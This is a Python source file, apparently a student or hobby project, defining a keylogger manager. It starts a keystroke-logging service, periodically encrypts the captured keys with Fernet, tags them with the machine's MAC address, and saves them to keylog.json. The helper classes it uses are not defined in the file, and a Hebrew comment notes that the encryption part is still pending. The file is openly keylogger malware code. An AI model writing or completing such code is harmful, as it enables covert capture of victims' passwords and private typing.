import threading
import datetime
import uuid
from cryptography.fernet import Fernet

class KeyLoggerManager:
    def __init__(self,keylogger_service,file_writer,encryptor,interval=60):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.encryptor = encryptor
        self.interval = interval
        self.running = False

    def start(self):
        self.keylogger_service.start_logging()
        self.running = True
        self._schedule_next_write()


    def stop(self):
        self.running = False
        self.keylogger_service.stop_logging()
        self._write_keys_to_file()


    def _schedule_next_write(self):
        if self.running:
            threading.Timer(self.interval, self._write_keys_to_file).start()


    def _write_keys_to_file(self):
        keys = self.keylogger_service.get_logged_keys()
        if keys:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            mac_address = self.encryptor.get_mac_address()
            encrypted_data = self.encryptor.encrypt("".join(keys))#מחכים לפרטים משמואל שעובד על ההצפנה

            log_entry = {
                "timestamp":timestamp,
                "mac_address":mac_address,
                "data":encrypted_data
            }
            self.file_writer.write_to_file(log_entry)
        self._schedule_next_write()

def generate_key():
    return Fernet.generate_key()


if __name__ == "__main__":
    key = generate_key()
    encryptor = Encryptor(key)
    file_writer = FileWriter("keylog.json", encryptor)
    keylogger_service = KeyLoggerService()
    manager = KeyLoggerManager(keylogger_service, file_writer,encryptor)
    manager.start()
